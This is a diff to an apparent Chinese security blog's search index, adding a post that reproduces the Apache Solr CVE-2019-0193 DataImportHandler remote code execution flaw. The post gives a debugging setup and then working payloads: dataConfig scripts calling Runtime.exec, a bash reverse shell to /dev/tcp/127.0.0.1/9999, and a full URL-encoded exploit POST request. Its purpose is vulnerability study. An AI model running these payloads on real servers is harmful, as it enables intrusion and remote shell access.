@@ -3,6 +3,257 @@
   
     
     <entry>
+      <title><![CDATA[Apache Solr CVE-2019-0193 复现与学习]]></title>
+      <url>/2019/09/08/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/Apache%20Solr%20CVE-2019-0193%20%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%AD%A6%E4%B9%A0/</url>
+      <content type="html"><![CDATA[<h1 id="Apache-Solr-CVE-2019-0193-复现与学习"><a href="#Apache-Solr-CVE-2019-0193-复现与学习" class="headerlink" title="Apache Solr CVE-2019-0193 复现与学习"></a>Apache Solr CVE-2019-0193 复现与学习</h1><p>[TOC]</p>
+<h2 id="简介（抄袭，具体功能没搞懂）"><a href="#简介（抄袭，具体功能没搞懂）" class="headerlink" title="简介（抄袭，具体功能没搞懂）"></a>简介（抄袭，具体功能没搞懂）</h2><p>Apache Solr是一个企业级搜索平台，用Java编写且开源，基于Apache Lucene项目。</p>
+<p>主要功能包括：<br>full-text search 全文搜索<br>hit highlighting<br>faceted search<br>dynamic clustering 动态聚类<br>document parsing 文档解析<br>Solr可以像数据库一样被使用：<br>1.运行服务器，创建collection1<br>2.从外部获取数据 - 向collection1发送不同类型的数据（例如文本，xml文档，pdf文档等任何格式）<br>3.存储数据并生成索引 - Solr自动索引这些数据并提供快速、丰富的REST API接口，以便于你搜索已有数据<br>与Solr服务器通信的唯一协议是HTTP，并且默认情况下无需身份验证即可访问，所以Solr容易受到web攻击(SSRF，CSRF等)。</p>
+<h2 id="漏洞-CVE-2019-0193"><a href="#漏洞-CVE-2019-0193" class="headerlink" title="漏洞 CVE-2019-0193"></a>漏洞 CVE-2019-0193</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>1.Apache Solr的DataImportHandler启用了模块DataImportHandler(默认情况下该模块不会被启用)</li>
+<li>2.Solr Admin UI未开启鉴权认证。（默认情况下打开web界面无需任何认证</li>
+</ul>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="简版vulhub"><a href="#简版vulhub" class="headerlink" title="简版vulhub"></a>简版vulhub</h4><p>直接利用vulhub进行搭建测试，详情按下不表。<br>这个漏洞复现遇到点问题，根据教程搭建的环境，进行复现，结果发现没法触发成功,运行poc 报错如下<br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673229505327.jpg" alt="-w1220"><br>感觉应该是vps的防火墙配置出的问题，换成本地调试没有问题<br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675248523422.jpg" alt="-w1375"><br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675248663003.jpg" alt="-w727"></p>
+<h4 id="配置下载"><a href="#配置下载" class="headerlink" title="配置下载"></a>配置下载</h4><p>apache solr 版本：Solr-8.1.1<br>jdk版本：1.8.0_144<br>在idea 中调试该环境</p>
+<h5 id="源码导入idea调试"><a href="#源码导入idea调试" class="headerlink" title="源码导入idea调试"></a>源码导入idea调试</h5><ul>
+<li>配置ant server</li>
+</ul>
+<p><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673449263122.jpg" alt="-w479"></p>
+<pre><code>ant ivy-bootstrap  //安装ivy
+cd solr
+ant server
+cd ..
+ant idea
+
+</code></pre><ul>
+<li>启动远程调试<br>创建 test core<br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673861985710.jpg" alt="-w610"><br>这个时候会发现报错，需要在<pre><code>solr-7.7.2/solr/server/solr/test/conf
+</code></pre>目录进行修改添加</li>
+</ul>
+<pre><code> &lt;requestHandler name=&quot;/dataimport&quot; class=&quot;solr.DataImportHandler&quot;&gt; 
+      &lt;lst name=&quot;defaults&quot;&gt; 
+        &lt;str name=&quot;config&quot;&gt;data-config.xml&lt;/str&gt; 
+      &lt;/lst&gt; 
+    &lt;/requestHandler&gt;
+</code></pre><p>发现继续报错</p>
+<pre><code>Error loading class &#39;org.apache.solr.handler.dataimport.DataImportHandler&#39;
+</code></pre><pre><code>cp solr/dist/solr-dataimporthander  server/solr-webapp/webapp/WEB-INF/lib 
+</code></pre><p><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675673373203.jpg" alt="-w458"></p>
+<p>可以正常创建了<br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675675380907.jpg" alt="-w1420"></p>
+<ul>
+<li>调试命令</li>
+</ul>
+<pre><code>$ cd solr-8.1.1\server
+$ java &quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000&quot; -Dsolr.solr.home=&quot;../example/example-DIH/solr/&quot; -jar start.jar --module=http
+</code></pre><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="数据源类型为URLDataSource"><a href="#数据源类型为URLDataSource" class="headerlink" title="数据源类型为URLDataSource"></a>数据源类型为URLDataSource</h4><ul>
+<li>测试poc：</li>
+</ul>
+<pre><code>&lt;dataConfig&gt;
+&lt;dataSource type=&quot;URLDataSource&quot;/&gt;
+  &lt;script&gt;&lt;![CDATA[ java.lang.Runtime.getRuntime().exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);
+  ]]&gt;&lt;/script&gt;
+  &lt;document&gt;
+    &lt;entity name=&quot;a&quot;
+            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;
+            processor=&quot;XPathEntityProcessor&quot;
+            forEach=&quot;/feed&quot;
+            transformer=&quot;script:&quot; /&gt;
+  &lt;/document&gt;
+&lt;/dataConfig&gt;
+</code></pre><ul>
+<li>反弹shell</li>
+</ul>
+<pre><code>&lt;dataConfig&gt;
+&lt;dataSource type=&quot;URLDataSource&quot;/&gt;
+  &lt;script&gt;&lt;![CDATA[ java.lang.Runtime.getRuntime().exec(&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/127.0.0.1/9999 0&gt;&amp;1&quot;);
+  ]]&gt;&lt;/script&gt;
+  &lt;document&gt;
+    &lt;entity name=&quot;a&quot;
+            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;
+            processor=&quot;XPathEntityProcessor&quot;
+            forEach=&quot;/feed&quot;
+            transformer=&quot;script:&quot; /&gt;
+  &lt;/document&gt;
+&lt;/dataConfig&gt;
+</code></pre><pre><code>&lt;dataConfig&gt;
+
+
+  &lt;dataSource type=&quot;URLDataSource&quot;/&gt;
+  &lt;script&gt;&lt;![CDATA[
+
+          function poc(row){
+
+ var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/127.0.0.1/9999 0&gt;&amp;1&quot;)));
+
+var result = [];
+
+while(true) {
+var oneline = bufReader.readLine();
+result.push( oneline );
+if(!oneline) break;
+}
+
+row.put(&quot;title&quot;,result.join(&quot;\n\r&quot;));
+
+return row;
+
+}
+
+
+  ]]&gt;&lt;/script&gt;
+
+        &lt;document&gt;
+             &lt;entity name=&quot;entity1&quot;
+                     url=&quot;https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml&quot;
+                     processor=&quot;XPathEntityProcessor&quot;
+                     forEach=&quot;/RDF/item&quot;
+                     transformer=&quot;script:poc&quot;&gt;
+                        &lt;field column=&quot;title&quot; xpath=&quot;/RDF/item/title&quot; /&gt;
+             &lt;/entity&gt;
+        &lt;/document&gt;
+&lt;/dataConfig&gt;
+</code></pre><p><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679455381821.jpg" alt="-w558"></p>
+<p>默认权限为程序的启动权限</p>
+<h5 id="远程检测poc"><a href="#远程检测poc" class="headerlink" title="远程检测poc"></a>远程检测poc</h5><ul>
+<li>外连有回显</li>
+</ul>
+<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataConfig</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataSource</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>URLDataSource<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token cdata">&lt;![CDATA[
+          function poc(row){
+ var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("ls").getInputStream()));
+
+var result = [];
+
+while(true) {
+var oneline = bufReader.readLine();
+result.push( oneline );
+if(!oneline) break;
+}
+
+row.put("title",result.join("\n\r"));
+
+return row;
+
+}
+  ]]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>document</span><span class="token punctuation">></span></span>
+             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entity</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>entity1<span class="token punctuation">"</span></span>
+                     <span class="token attr-name">url</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml<span class="token punctuation">"</span></span>
+                     <span class="token attr-name">processor</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>XPathEntityProcessor<span class="token punctuation">"</span></span>
+                     <span class="token attr-name">forEach</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/RDF/item<span class="token punctuation">"</span></span>
+                     <span class="token attr-name">transformer</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>script:poc<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span> <span class="token attr-name">xpath</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/RDF/item/title<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>entity</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>document</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dataConfig</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>其中<code>https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml</code>文件内容如下：</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>RDF</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>item</span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>RDF</span><span class="token punctuation">></span></span>
+</code></pre>
+<p><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679479637186.jpg" alt="-w1437"></p>
+<h4 id="数据源类型为ContentStreamDataSource"><a href="#数据源类型为ContentStreamDataSource" class="headerlink" title="数据源类型为ContentStreamDataSource"></a>数据源类型为ContentStreamDataSource</h4><ul>
+<li>不外连 + 回显<br>在该检测方式中 由于 ContentStreamDataSource能接收Post数据直接作为数据源，可以不用外连获取数据源。</li>
+</ul>
+<pre><code>POST /solr/tika/dataimport?command=full-import&amp;verbose=false&amp;clean=false&amp;commit=false&amp;debug=true&amp;core=tika&amp;name=dataimport&amp;dataConfig=%0a%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0a%3c%64%61%74%61%53%6f%75%72%63%65%20%6e%61%6d%65%3d%22%73%74%72%65%61%6d%73%72%63%22%20%74%79%70%65%3d%22%43%6f%6e%74%65%6e%74%53%74%72%65%61%6d%44%61%74%61%53%6f%75%72%63%65%22%20%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%22%54%52%41%43%45%22%20%2f%3e%0a%0a%20%20%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%0a%20%20%20%20%20%20%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%70%6f%63%28%72%6f%77%29%7b%0a%20%76%61%72%20%62%75%66%52%65%61%64%65%72%20%3d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%66%63%6f%6e%66%69%67%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%0a%0a%76%61%72%20%72%65%73%75%6c%74%20%3d%20%5b%5d%3b%0a%0a%77%68%69%6c%65%28%74%72%75%65%29%20%7b%0a%76%61%72%20%6f%6e%65%6c%69%6e%65%20%3d%20%62%75%66%52%65%61%64%65%72%2e%72%65%61%64%4c%69%6e%65%28%29%3b%0a%72%65%73%75%6c%74%2e%70%75%73%68%28%20%6f%6e%65%6c%69%6e%65%20%29%3b%0a%69%66%28%21%6f%6e%65%6c%69%6e%65%29%20%62%72%65%61%6b%3b%0a%7d%0a%0a%72%6f%77%2e%70%75%74%28%22%74%69%74%6c%65%22%2c%72%65%73%75%6c%74%2e%6a%6f%69%6e%28%22%5c%6e%5c%72%22%29%29%3b%0a%72%65%74%75%72%6e%20%72%6f%77%3b%0a%0a%7d%0a%0a%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0a%0a%3c%64%6f%63%75%6d%65%6e%74%3e%0a%20%20%20%20%3c%65%6e%74%69%74%79%0a%20%20%20%20%20%20%20%20%73%74%72%65%61%6d%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%6e%61%6d%65%3d%22%65%6e%74%69%74%79%31%22%0a%20%20%20%20%20%20%20%20%64%61%74%61%73%6f%75%72%63%65%3d%22%73%74%72%65%61%6d%73%72%63%31%22%0a%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0a%20%20%20%20%20%20%20%20%72%6f%6f%74%45%6e%74%69%74%79%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%52%44%46%2f%69%74%65%6d%22%0a%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%73%63%72%69%70%74%3a%70%6f%63%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%66%69%65%6c%64%20%63%6f%6c%75%6d%6e%3d%22%74%69%74%6c%65%22%20%78%70%61%74%68%3d%22%2f%52%44%46%2f%69%74%65%6d%2f%74%69%74%6c%65%22%20%2f%3e%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0a%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e%0a%20%20%20%20%0a%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1
+Host: solr.com:8983
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
+Accept: application/json, text/plain, */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://solr.com:8983/solr/
+Content-Length: 210
+content-type: multipart/form-data; boundary=------------------------aceb88c2159f183f
+
+
+--------------------------aceb88c2159f183f
+Content-Disposition: form-data; name=&quot;stream.body&quot;
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;RDF&gt;
+&lt;item/&gt;
+&lt;/RDF&gt;
+
+--------------------------aceb88c2159f183f--
+</code></pre><p>url 解码后数据如下</p>
+<pre class=" language-xml"><code class="language-xml">
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataConfig</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataSource</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>streamsrc<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ContentStreamDataSource<span class="token punctuation">"</span></span> <span class="token attr-name">loggerLevel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>TRACE<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token cdata">&lt;![CDATA[
+          function poc(row){
+ var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("ifconfig").getInputStream()));
+
+var result = [];
+
+while(true) {
+var oneline = bufReader.readLine();
+result.push( oneline );
+if(!oneline) break;
+}
+
+row.put("title",result.join("\n\r"));
+return row;
+
+}
+
+]]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>document</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entity</span>
+        <span class="token attr-name">stream</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span>
+        <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>entity1<span class="token punctuation">"</span></span>
+        <span class="token attr-name">datasource</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>streamsrc1<span class="token punctuation">"</span></span>
+        <span class="token attr-name">processor</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>XPathEntityProcessor<span class="token punctuation">"</span></span>
+        <span class="token attr-name">rootEntity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span>
+        <span class="token attr-name">forEach</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/RDF/item<span class="token punctuation">"</span></span>
+        <span class="token attr-name">transformer</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>script:poc<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span> <span class="token attr-name">xpath</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/RDF/item/title<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>entity</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>document</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dataConfig</span><span class="token punctuation">></span></span>
+</code></pre>
+<p><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679482413077.jpg" alt="-w1428"></p>
+<p>该方法虽然方便 但检测可能失败<br>缺点:对低版本无法检测 - 因为通过POST请求修改configoverlay.json文件中的配置会失败<br>可以先用以下数据包检测</p>
+<pre><code>POST /solr/tika/config HTTP/1.1
+Host: 127.0.0.1
+Accept: */*
+Content-type:application/json
+Content-Length: 159
+Connection: close
+
+{&quot;set-property&quot;: {&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;: true}, &quot;set-property&quot;: {&quot;requestDispatcher.requestParsers.enableStreamBody&quot;: true}}
+
+</code></pre><p>返回200 则可用该版本可行检测，500 则不行<br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679484163317.jpg" alt="-w1263"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.ishenping.com/ArtInfo/1196947.html" target="_blank" rel="noopener">solr源码通过idea进行本地调试</a><br><a href="https://github.com/jas502n/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-0193</a><br><a href="https://github.com/Imanfeng/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/Imanfeng/CVE-2019-0193</a><br><a href="https://github.com/1135/solr_exploit#%E6%A3%80%E6%B5%8B%E6%BC%8F%E6%B4%9E---exploit1" target="_blank" rel="noopener">https://github.com/1135/solr_exploit#%E6%A3%80%E6%B5%8B%E6%BC%8F%E6%B4%9E—exploit1</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> web 渗透 </category>
+            
+            <category> 漏洞学习 </category>
+            
+            <category> Apache Solr CVE-2019-0193 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 漏洞学习 </tag>
+            
+            <tag> web 渗透 </tag>
+            
+            <tag> Apache Solr CVE-2019-0193 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[fastjson 反序列化（二）]]></title>
       <url>/2019/07/28/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/fastjson_2/</url>
       <content type="html"><![CDATA[<h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1><p>在接触了fastjson的rce后，感觉还是得调用下fastjson ，最好能自己写一个漏洞环境出来</p>
@@ -934,9 +1185,9 @@ Content-Type代表发送端（客户端|服务器）发送的实体数据的数�
             
             <tag> Web渗透 </tag>
             
-            <tag> 漏洞学习 </tag>
-            
             <tag> XXE </tag>
+            
+            <tag> 漏洞学习 </tag>
             
         </tags>
         
